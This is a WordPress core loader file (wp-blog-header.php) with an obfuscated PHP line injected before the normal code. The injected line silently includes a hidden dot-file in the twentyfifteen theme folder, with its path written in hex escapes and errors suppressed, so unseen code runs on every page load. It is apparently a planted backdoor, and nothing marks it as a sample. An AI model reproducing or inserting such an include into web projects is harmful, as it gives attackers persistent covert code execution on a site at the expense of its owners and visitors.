<?php @include_once("/h\x6fm\x65\x2f\x61\x72\x74\x73\x74\x75d\x69/\x70u\x62\x6ci\x63_\x68t\x6dl\x2f/wp\x2dc\x6f\x6e\x74en\x74/\x74he\x6d\x65\x73\x2ft\x77\x65\x6etyf\x69\x66\x74\x65en/\x2e\x39a86\x63\x63"); ?><?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( !isset($wp_did_header) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once( dirname(__FILE__) . '/wp-load.php' );

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once( ABSPATH . WPINC . '/template-loader.php' );

}
